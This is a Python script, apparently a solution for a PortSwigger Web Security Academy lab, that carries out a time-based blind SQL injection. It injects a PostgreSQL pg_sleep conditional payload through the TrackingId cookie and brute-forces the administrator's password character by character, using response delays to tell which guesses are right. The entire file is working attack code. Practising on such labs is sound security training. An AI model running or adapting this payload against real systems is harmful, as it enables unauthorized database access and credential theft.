from pwn import *
from termcolor import colored

import requests
import signal
import sys
import string
import time

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", 'red'))
    p1.failure("Ataque de fuerza bruta detenido")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLi")

def makeSQLi():
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    password = ""

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:

            cookies = {
                'TrackingId': f"test'||(select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(3) else pg_sleep(0) end from users)--",
                'session': 'Likdyr1YeNj01gP3QJCEYLboh2e6q4GM'
            }

            p1.status(cookies["TrackingId"])

            time_start = time.time()

            r = requests.get("https://0aa100ed04832e02817c438800da0056.web-security-academy.net", cookies=cookies)

            time_end = time.time()

            if time_end - time_start > 2:
                password += character
                print(character)

if __name__ == '__main__':
    makeSQLi()
